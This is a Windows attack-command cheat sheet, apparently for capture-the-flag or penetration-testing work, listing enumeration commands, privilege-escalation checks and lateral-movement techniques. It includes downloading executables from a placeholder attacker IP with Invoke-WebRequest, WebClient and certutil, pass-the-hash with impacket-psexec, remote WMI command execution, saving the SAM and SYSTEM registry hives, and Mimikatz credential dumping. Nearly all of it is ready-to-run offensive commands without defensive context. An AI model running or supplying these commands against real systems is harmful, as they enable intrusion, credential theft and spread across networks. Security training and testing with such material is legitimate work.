# Windows Commands Cheatsheet

## Enumeration (CMD)

```cmd
whoami
whoami /priv
whoami /groups
net user
net user username
net localgroup administrators
net localgroup
systeminfo
hostname
ipconfig /all
netstat -ano
tasklist /SVC
sc query
wmic service list brief
wmic product get name,version
dir /s /b C:\Users\ 2>NUL
dir /a C:\
type C:\Users\user\Desktop\user.txt
```

## Enumeration (PowerShell)

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-Process
Get-Service
Get-ScheduledTask
Get-ChildItem -Recurse -Force C:\Users\ -ErrorAction SilentlyContinue
Get-Content "C:\Users\user\Desktop\user.txt"
$env:PATH
[System.Environment]::GetEnvironmentVariables()
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
```

## File Transfer (PowerShell)

```powershell
# Download a file
Invoke-WebRequest -Uri http://IP:8080/file.exe -OutFile C:\Temp\file.exe
(New-Object Net.WebClient).DownloadFile('http://IP:8080/file.exe','C:\Temp\file.exe')
certutil -urlcache -split -f http://IP:8080/file.exe C:\Temp\file.exe

# Encode and transfer
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.txt"))
```

## Privilege Escalation Checks

```cmd
# Check unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Check service permissions
icacls "C:\path\to\service.exe"

# AlwaysInstallElevated check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check for stored credentials
cmdkey /list
```

## Lateral Movement

```cmd
# Pass-the-Hash with PsExec (from Kali)
impacket-psexec -hashes :NTLMHASH DOMAIN/Administrator@TARGET

# WMI execution
wmic /node:TARGET process call create "cmd.exe /c command"

# Remote PowerShell
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
```

## Credential Access

```powershell
# Read SAM hive (requires SYSTEM)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Dump credentials with Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```
